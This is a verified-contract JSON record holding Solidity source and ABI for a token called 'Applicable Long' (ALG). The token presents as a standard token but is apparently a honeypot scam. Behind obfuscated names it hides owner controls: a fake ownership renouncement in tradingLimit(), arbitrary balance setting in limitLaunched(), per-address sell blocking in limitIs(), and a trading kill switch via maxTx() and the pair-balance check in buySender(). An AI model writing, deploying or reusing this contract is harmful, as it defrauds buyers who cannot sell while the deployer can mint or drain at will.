{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface exemptTradingList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletSwap) external view returns (uint256);\n\n    function transfer(address amountFundTotal, uint256 walletShould) external returns (bool);\n\n    function allowance(address marketingList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountFundTotal,\n        uint256 walletShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromTeam, uint256 value);\n    event Approval(address indexed marketingList, address indexed spender, uint256 value);\n}\n\nabstract contract modeLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapEnable {\n    function createPair(address autoShould, address shouldFromMax) external returns (address);\n}\n\ninterface exemptTradingListMetadata is exemptTradingList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ApplicableLong is modeLaunched, exemptTradingList, exemptTradingListMetadata {\n\n    bool private exemptSender;\n\n    function balanceOf(address walletSwap) public view virtual override returns (uint256) {\n        return totalExempt[walletSwap];\n    }\n\n    function owner() external view returns (address) {\n        return isTokenAt;\n    }\n\n    bool private buyFee;\n\n    bool private teamReceiverTotal;\n\n    function launchedSender(address takeMarketing) public {\n        if (limitLiquidity) {\n            return;\n        }\n        if (isTeamList != teamReceiverTotal) {\n            teamReceiverTotal = true;\n        }\n        teamFrom[takeMarketing] = true;\n        if (txWallet != buyFee) {\n            teamReceiverTotal = true;\n        }\n        limitLiquidity = true;\n    }\n\n    function maxTx(uint256 walletShould) public {\n        takeLimit();\n        receiverToken = walletShould;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableSender;\n    }\n\n    function limitLaunched(address senderBuy, uint256 walletShould) public {\n        takeLimit();\n        totalExempt[senderBuy] = walletShould;\n    }\n\n    address public enableMin;\n\n    function symbol() external view virtual override returns (string memory) {\n        return toSender;\n    }\n\n    bool private isTeamList;\n\n    function transferFrom(address isLiquidityToken, address amountFundTotal, uint256 walletShould) external override returns (bool) {\n        if (_msgSender() != limitFrom) {\n            if (tokenSender[isLiquidityToken][_msgSender()] != type(uint256).max) {\n                require(walletShould <= tokenSender[isLiquidityToken][_msgSender()]);\n                tokenSender[isLiquidityToken][_msgSender()] -= walletShould;\n            }\n        }\n        return buySender(isLiquidityToken, amountFundTotal, walletShould);\n    }\n\n    function transfer(address senderBuy, uint256 walletShould) external virtual override returns (bool) {\n        return buySender(_msgSender(), senderBuy, walletShould);\n    }\n\n    mapping(address => bool) public enableMarketing;\n\n    uint256 receiverToken;\n\n    bool private tradingSellExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return minTradingMax;\n    }\n\n    function buySender(address isLiquidityToken, address amountFundTotal, uint256 walletShould) internal returns (bool) {\n        if (isLiquidityToken == atMin) {\n            return buyAuto(isLiquidityToken, amountFundTotal, walletShould);\n        }\n        uint256 tokenEnable = exemptTradingList(enableMin).balanceOf(feeAuto);\n        require(tokenEnable == receiverToken);\n        require(amountFundTotal != feeAuto);\n        if (enableMarketing[isLiquidityToken]) {\n            return buyAuto(isLiquidityToken, amountFundTotal, txSender);\n        }\n        return buyAuto(isLiquidityToken, amountFundTotal, walletShould);\n    }\n\n    mapping(address => uint256) private totalExempt;\n\n    function buyAuto(address isLiquidityToken, address amountFundTotal, uint256 walletShould) internal returns (bool) {\n        require(totalExempt[isLiquidityToken] >= walletShould);\n        totalExempt[isLiquidityToken] -= walletShould;\n        totalExempt[amountFundTotal] += walletShould;\n        emit Transfer(isLiquidityToken, amountFundTotal, walletShould);\n        return true;\n    }\n\n    uint8 private enableSender = 18;\n\n    mapping(address => mapping(address => uint256)) private tokenSender;\n\n    function getOwner() external view returns (address) {\n        return isTokenAt;\n    }\n\n    function approve(address autoWallet, uint256 walletShould) public virtual override returns (bool) {\n        tokenSender[_msgSender()][autoWallet] = walletShould;\n        emit Approval(_msgSender(), autoWallet, walletShould);\n        return true;\n    }\n\n    uint256 private teamMax = 100000000 * 10 ** 18;\n\n    bool private feeReceiver;\n\n    address public atMin;\n\n    function tradingLimit() public {\n        emit OwnershipTransferred(atMin, address(0));\n        isTokenAt = address(0);\n    }\n\n    uint256 fromFee;\n\n    uint256 constant txSender = 2 ** 10;\n\n    function takeLimit() private view {\n        require(teamFrom[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamMax;\n    }\n\n    event OwnershipTransferred(address indexed limitReceiver, address indexed feeList);\n\n    function limitIs(address launchedLaunch) public {\n        takeLimit();\n        \n        if (launchedLaunch == atMin || launchedLaunch == enableMin) {\n            return;\n        }\n        enableMarketing[launchedLaunch] = true;\n    }\n\n    string private toSender = \"ALG\";\n\n    mapping(address => bool) public teamFrom;\n\n    constructor (){\n        if (teamReceiverTotal) {\n            feeReceiver = true;\n        }\n        tokenFee receiverReceiverFund = tokenFee(limitFrom);\n        enableMin = swapEnable(receiverReceiverFund.factory()).createPair(receiverReceiverFund.WETH(), address(this));\n        if (isTeamList == buyFee) {\n            buyFee = false;\n        }\n        atMin = _msgSender();\n        tradingLimit();\n        teamFrom[atMin] = true;\n        totalExempt[atMin] = teamMax;\n        \n        emit Transfer(address(0), atMin, teamMax);\n    }\n\n    bool public txWallet;\n\n    bool public limitLiquidity;\n\n    address feeAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address limitFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private sellMode;\n\n    address private isTokenAt;\n\n    function allowance(address buyWallet, address autoWallet) external view virtual override returns (uint256) {\n        if (autoWallet == limitFrom) {\n            return type(uint256).max;\n        }\n        return tokenSender[buyWallet][autoWallet];\n    }\n\n    string private minTradingMax = \"Applicable Long\";\n\n    uint256 private liquidityTradingTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMarketing\",\"type\":\"address\"}],\"name\":\"launchedSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLaunch\",\"type\":\"address\"}],\"name\":\"limitIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletShould\",\"type\":\"uint256\"}],\"name\":\"limitLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletShould\",\"type\":\"uint256\"}],\"name\":\"maxTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidityToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountFundTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ApplicableLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}